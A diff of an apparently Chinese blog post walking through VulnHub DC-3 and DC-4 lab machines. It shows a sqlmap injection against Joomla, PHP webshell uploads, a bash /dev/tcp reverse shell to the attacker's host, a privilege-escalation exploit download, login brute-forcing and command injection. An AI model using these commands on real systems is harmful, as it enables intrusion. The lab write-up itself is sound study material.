class="string">_</span>|<span class="string">\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it&#x27;s all greatly</span></span><br><span class="line"><span class="string">appreciated.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span></span><br><span class="line"><span class="string">意思是：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">恭喜！！！</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">特别感谢所有给我发推文的人</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">并向我提供了反馈-非常棒</span></span><br><span class="line"><span class="string">谢谢。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果您喜欢这个CTF，请通过@DCAU7给我发一条推文</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>5个旗子找完，游戏结束</strong></p>
 <hr>
 <h1 id="三、DC-3-初级"><a href="#三、DC-3-初级" class="headerlink" title="三、DC-3[初级]"></a>三、DC-3[初级]</h1><p><strong>only one flag</strong></p>
-<h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>【前面的靶机ip寻找，按之前的步骤即可】</p>
-<p>先用nmap扫一下我们的靶机ip</p>
+<h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>【前面的靶机<code>ip</code>寻找，按之前的步骤即可】</p>
+<p>先用<code>nmap</code>扫一下我们的靶机<code>ip</code></p>
 <figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p- <span class="number">192.168.133.139</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220902123406584.png" alt="image-20220902123406584"></p>
 <p>看到只有<code>80</code>端口，运行着一个<code>http</code>服务，中间件为<code>apache2.4.18</code></p>
-<p>内容管理系统（CMS）是<code>joomla</code></p>
+<p>内容管理系统（<code>CMS</code>）是<code>joomla</code></p>
 <p><img src="/2022/08/29/vulnhub/image-20220902123056590.png" alt="image-20220902123056590"></p>
-<p>利用插件<code>wappalyzer</code>，也可以看到其CMS为joomla</p>
-<p>我们可以利用kali包当中自带的joomscan工具对其进行扫描</p>
+<p>利用插件<code>wappalyzer</code>，也可以看到其<code>CMS</code>为<code>joomla</code></p>
+<p>我们可以利用<code>kali</code>包当中自带的<code>joomscan</code>工具对其进行扫描</p>
 <p>【没有的，可能需要更新包，然后直接下载即可】</p>
 <p><img src="/2022/08/29/vulnhub/image-20220902185529785.png" alt="image-20220902185529785"></p>
 <figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">输入joomscan -u <span class="number">192.168.133.139</span></span><br></pre></td></tr></table></figure>
@@ -1410,12 +1408,12 @@ handler 指向RequestHandler
 <p><img src="/2022/08/29/vulnhub/image-20220902195723987.png" alt="image-20220902195723987"></p>
 <p>然后寻找下载payload</p>
 <hr>
-<p>也可以在终端输入命令查询【也是基于Exploit-DB的命令行搜索工具,可以帮助我们查找渗透模块】</p>
+<p>也可以在终端输入命令查询【也是基于<code>Exploit-DB</code>的命令行搜索工具,可以帮助我们查找渗透模块】</p>
 <figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">输入searchsploit <span class="keyword">joomla </span><span class="number">3</span>.<span class="number">7</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220903084826356.png" alt="image-20220903084826356"></p>
 <p>可以看到<code>joomla 3.7.0</code>版本存在<code>sql注入</code>的漏洞</p>
-<p> 然后查看Path</p>
+<p> 然后查看<code>Path</code></p>
 <figure class="highlight css"><table><tr><td class="code"><pre><span class="line">输入searchsploit -<span class="selector-tag">p</span> <span class="number">42033</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220903124805721.png" alt="image-20220903124805721"></p>
@@ -1423,8 +1421,8 @@ handler 指向RequestHandler
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">42033</span>.txt</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220903125053542.png" alt="image-20220903125053542"></p>
-<p>可以看到该漏洞的测试平台，时间，还有漏洞的CVE编号</p>
-<p>关键在它给出的sqlmap注入的模板</p>
+<p>可以看到该漏洞的测试平台，时间，还有漏洞的<code>CVE</code>编号</p>
+<p>关键在它给出的<code>sqlmap</code>注入的模板</p>
 <figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;<span class="link">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line"><span class="comment">//把localhost改成靶机ip即可</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220903125630036.png" alt="image-20220903125630036"></p>
@@ -1476,19 +1474,19 @@ handler 指向RequestHandler
 
 <p><img src="/2022/08/29/vulnhub/image-20220903223007361.png" alt="image-20220903223007361"></p>
 <p>得到靶机对应的木马</p>
-<p>然后在网站新建一个php文件</p>
+<p>然后在网站新建一个<code>php</code>文件</p>
 <p><img src="/2022/08/29/vulnhub/image-20220903221145987.png" alt="image-20220903221145987"></p>
 <p>然后把木马内容导入进去</p>
 <p><img src="/2022/08/29/vulnhub/image-20220903223039265.png" alt="image-20220903223039265"></p>
 <p> 然后保存一下</p>
 <p><img src="/2022/08/29/vulnhub/image-20220903221243628.png" alt="image-20220903221243628"></p>
 <p>然后我们就需要找到木马文件路径，进行访问看看，能不能访问成功</p>
-<p>因为我们文件是在&#96;&#x2F;templates&#x2F;protostar&#x2F;下上传的，所以访问</p>
+<p>因为我们文件是在<code>/templates/protostar/</code>下上传的，所以访问</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220903221340927.png" alt="image-20220903221340927"></p>
-<p>看到&#x2F;*，看来是可以成功访问</p>
-<h5 id="msf利用木马"><a href="#msf利用木马" class="headerlink" title="msf利用木马"></a>msf利用木马</h5><p>然后用msf进行利用</p>
+<p>看到<code>/*</code>，看来是可以成功访问</p>
+<h5 id="msf利用木马"><a href="#msf利用木马" class="headerlink" title="msf利用木马"></a>msf利用木马</h5><p>然后用<code>msf</code>进行利用</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">先输入msfconsole，进入msf</span><br></pre></td></tr></table></figure>
 
 
@@ -1520,18 +1518,18 @@ handler 指向RequestHandler
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">uname</span> -a</span><br><span class="line">查看系统版本</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220904082811177.png" alt="image-20220904082811177"></p>
-<p>看到unbuntu是2016年4月发布的，所以是unbuntu16.04</p>
-<p>linux版本是4.4.0-21版</p>
+<p>看到<code>unbuntu</code>是<code>2016</code>年<code>4</code>月发布的，所以是<code>unbuntu16.04</code></p>
+<p><code>linux</code>版本是<code>4.4.0-21</code>版</p>
 <p>所以根据这个版本看看有没有可以利用的漏洞，来方便我们提权</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">还是利用之前用过的</span><br><span class="line">searchsploit unbuntu 16.04</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220904093243588.png" alt="image-20220904093243588"></p>
-<p><strong>double-fdput()</strong> ,这是运行可执行文件，即可获取root权限</p>
+<p><strong>double-fdput()</strong> ,这是运行可执行文件，即可获取<code>root</code>权限</p>
 <p>我们把它内容显示出来</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入searchsploit -p <span class="number">39772</span>显示文本路径</span><br><span class="line">   cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>local/<span class="number">39772</span>.txt 显示内容</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220904093849189.png" alt="image-20220904093849189"></p>
-<p>在最后看到该漏洞利用的exp下载链接</p>
+<p>在最后看到该漏洞利用的<code>exp</code>下载链接</p>
 <p><img src="/2022/08/29/vulnhub/image-20220904095521748.png" alt="image-20220904095521748"></p>
 <p>下载最后一个链接的压缩包</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/offensive-security/</span>exploitdb-bin-sploits<span class="regexp">/raw/m</span>aster<span class="regexp">/bin-sploits/</span><span class="number">39772</span>.zip</span><br></pre></td></tr></table></figure>
@@ -1542,7 +1540,7 @@ handler 指向RequestHandler
 <p><img src="/2022/08/29/vulnhub/image-20220904101159692.png" alt="image-20220904101159692"></p>
 <p>看来这个网站上传处是不能上传压缩包文件的</p>
 <p>所以我们只能用工具进行直接上传了，比如蚁剑或者菜刀等工具</p>
-<p>我们和之前一样新建一个php文件写上我们的一句话木马</p>
+<p>我们和之前一样新建一个<code>php</code>文件写上我们的一句话木马</p>
 <p><img src="/2022/08/29/vulnhub/image-20220904101711601.png" alt="image-20220904101711601"></p>
 <p>用蚁剑连接</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">123</span>.php</span><br></pre></td></tr></table></figure>
@@ -1550,7 +1548,7 @@ handler 指向RequestHandler
 <p><img src="/2022/08/29/vulnhub/image-20220904101700569.png" alt="image-20220904101700569"></p>
 <p>然后把我们的压缩包放在目录下</p>
 <p><img src="/2022/08/29/vulnhub/image-20220904112832628.png" alt="image-20220904112832628"></p>
-<p>然后返回msf</p>
+<p>然后返回<code>msf</code></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220904112929091.png" alt="image-20220904112929091"></p>
@@ -1585,7 +1583,7 @@ handler 指向RequestHandler
 
 <p><img src="/2022/08/29/vulnhub/image-20220904114119370.png" alt="image-20220904114119370"></p>
 <p>提权成功</p>
-<p>然后我们到&#x2F;root目录下查看 flag</p>
+<p>然后我们到<code>/root</code>目录下查看 <code>flag</code></p>
 <p><img src="/2022/08/29/vulnhub/image-20220904114212223.png" alt="image-20220904114212223"></p>
 <hr>
 <figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line"> \ \      / /__|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \  ___  _ __   ___</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">  \ \ /\ / / _ \ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">   \ V  V /  __/ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_</span>|</span><br><span class="line">    \_/\_/ \___|<span class="string">_</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">____/ \___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___(_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_)</span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations are in order.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you&#x27;ve enjoyed this challenge as I enjoyed making it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If there are any ways that I can improve these little challenges,</span></span><br><span class="line"><span class="string">please let me know.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Have a great day!!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">意思是：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">恭喜你，一切正常。：-）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">我希望你和我一样喜欢这个挑战。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果有任何方法可以改善这些小挑战，</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">请让我知道。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如往常一样，评论和投诉可以通过Twitter发送到@DCAU7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">祝你有美好的一天！！！！ </span></span><br></pre></td></tr></table></figure>
@@ -1593,26 +1591,26 @@ handler 指向RequestHandler
 <p><strong>一个旗子找完，游戏结束</strong></p>
 <h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h4><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">反弹<span class="keyword">shell</span><span class="language-bash">，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</span></span><br><span class="line"></span><br><span class="line">通俗点说，反弹<span class="keyword">shell</span><span class="language-bash">就是一种反向链接，与正向的ssh等不同，它是在对方电脑执行命令连接到我方的攻击模式，并且这种攻击模式必须搭配远程执行命令漏洞来使用。</span></span><br><span class="line"></span><br><span class="line">由于防火墙等限制，对方机器只能发送请求，不能接收请求</span><br><span class="line"></span><br><span class="line">对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，建立一个服务端，让恶意程序主动连接，才是上策。</span><br></pre></td></tr></table></figure>
 
-<p>和法一一样，我们需要写一个反弹shell的php文件</p>
+<p>和法一一样，我们需要写一个反弹<code>shell</code>的<code>php</code>文件</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.133.140/8888 0&gt;&amp;1&#x27;&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注意这里的ip为kali的ip，8888为监听的端口</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220904115013063.png" alt="image-20220904115013063"></p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入nc -lnvp <span class="number">8888</span>开始监听</span><br><span class="line">然后访问<span class="number">456</span>.php</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">456</span>.php</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220904130847588.png" alt="image-20220904130847588"></p>
-<p>拿到shell，后面提权和法一</p>
+<p>拿到<code>shell</code>，后面提权和法一</p>
 <p>一样</p>
 <h3 id="法3"><a href="#法3" class="headerlink" title="法3"></a>法3</h3><h4 id="weevely【提权没回显】"><a href="#weevely【提权没回显】" class="headerlink" title="weevely【提权没回显】"></a><strong>weevely</strong>【提权没回显】</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Weevely是一款使用python编写的webshell工具,集webshell生成和连接于一身,采用c/s模式 构建,可以算作是linux下的一款php菜刀替代工具</span><br></pre></td></tr></table></figure>
 
-<p>生成Shell</p>
+<p>生成<code>Shell</code></p>
 <figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">weevely <span class="keyword">generate</span>  &lt;文件名&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">weevely <span class="keyword">generate</span> <span class="number">123456</span> shell<span class="variable">.php</span></span><br></pre></td></tr></table></figure>
 
 <p>把生成的内容，复制到我们创建的<code>789.php</code>文件里，和前面两个方法步骤一样</p>
-<p>利用触发shell</p>
+<p>利用触发<code>shell</code></p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">weevely</span> http://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">789</span>.php <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">python</span> -m http.server <span class="number">9999</span>   </span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220904133118746.png" alt="image-20220904133118746"></p>
-<p>成功进入shell</p>
+<p>成功进入<code>shell</code></p>
 <p>但是当执行提权时</p>
 <p><img src="/2022/08/29/vulnhub/image-20220904135935922.png" alt="image-20220904135935922"></p>
 <p>报错无法提权，看来是被过滤啥的</p>
@@ -1620,17 +1618,17 @@ handler 指向RequestHandler
 <h1 id="四、DC-4-初级"><a href="#四、DC-4-初级" class="headerlink" title="四、DC-4[初级]"></a>四、DC-4[初级]</h1><p><strong>only one flag</strong></p>
 <h2 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h2><p>先看看靶机端口运行的服务</p>
 <p><img src="/2022/08/29/vulnhub/image-20220918190610478.png" alt="image-20220918190610478"></p>
-<p>发现有22和80端口，分别运行ssh和http</p>
-<p>我们先访问80端口</p>
+<p>发现有<code>22</code>和<code>80</code>端口，分别运行<code>ssh</code>和<code>http</code></p>
+<p>我们先访问<code>80</code>端口</p>
 <figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">访问<span class="built_in">ip</span>：<span class="number">192</span>.<span class="number">168</span>.<span class="number">133</span>.<span class="number">141</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220918190945726.png" alt="image-20220918190945726"></p>
-<p>是一个基本的登录窗口，有提示是admin用户登录界面，所以<strong>可能需要密码爆破登录</strong></p>
+<p>是一个基本的登录窗口，有提示是<code>admin</code>用户登录界面，所以<strong>可能需要密码爆破登录</strong></p>
 <p>我们再利用<code>wappalyzer</code>看一下网站一些基本信息</p>
 <p><img src="/2022/08/29/vulnhub/image-20220918194402321.png" alt="image-20220918194402321"></p>
 <p>没有啥有用的信息</p>
 <h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>然后我们就开始进行密码爆破</p>
-<p>已知用户名为admin，只用对密码爆破</p>
+<p>已知用户名为<code>admin</code>，只用对密码爆破</p>
 <p><img src="/2022/08/29/vulnhub/image-20220918202233098.png" alt="image-20220918202233098"></p>
 <p>【字典可以自己找，当然也可以看我学习笔记写的网站下载】</p>
 <p>这里我用的<code>top2000.txt</code></p>
@@ -1640,7 +1638,7 @@ handler 指向RequestHandler
 <p><img src="/2022/08/29/vulnhub/image-20220918204147349.png" alt="image-20220918204147349"></p>
 <p>登录成功，进入<code>Command</code></p>
 <p><img src="/2022/08/29/vulnhub/image-20220918204230810.png" alt="image-20220918204230810"></p>
-<p>点击run，就会显示上面的数据，看来是命令执行，但是它默认是<code>ls -l</code>，我们试试抓包能修改请求包里的命令吗</p>
+<p>点击<code>run</code>，就会显示上面的数据，看来是命令执行，但是它默认是<code>ls -l</code>，我们试试抓包能修改请求包里的命令吗</p>
 <p><img src="/2022/08/29/vulnhub/image-20220918204413877.png" alt="image-20220918204413877"></p>
 <p>发现是可以修改的，我们试试<code>whoami</code>命令，看看当前网站登录用户权限</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
@@ -1699,7 +1697,7 @@ handler 指向RequestHandler
 
 
 
-<p>然后我们登录ssh</p>
+<p>然后我们登录<code>ssh</code></p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">输入ssh <span class="symbol">jim@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.141</span> -p <span class="number">22</span></span><br></pre></td></tr></table></figure>
 
 <p>然后输入密码后，登录成功</p>
@@ -1806,7 +1804,7 @@ handler 指向RequestHandler
 <p><code>concat.php</code>的底部为了显示和<code>footer.php</code>的实现功能，肯定是实现了文件包含，</p>
 <p><code>concat.php</code>把<code>footer.php</code>文件包含了</p>
 <p>&#x3D;&#x3D;&gt;我们渗透的基础思路就变成了<strong>利用的文件包含   拿到shell</strong></p>
-<h3 id="1-验证我们的想法"><a href="#1-验证我们的想法" class="headerlink" title="1.验证我们的想法"></a>1.验证我们的想法</h3><p>【文件包含一般变量为file，当然如果出现怎么都不行的，那就可以用<code>爆破</code>**(fuzz)**或者我们的思路错误了】</p>
+<h3 id="1-验证我们的想法"><a href="#1-验证我们的想法" class="headerlink" title="1.验证我们的想法"></a>1.验证我们的想法</h3><p>【文件包含注入点可控参数名一般为<code>file</code>，当然如果出现怎么都不行的，那就可以用<code>爆破</code>**(fuzz)**或者我们的思路错误了】</p>
 <p>我们先试试能不能包含<code>index.php</code></p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.143</span>/thankyou.php?file=index.php</span><br></pre></td></tr></table></figure>
 
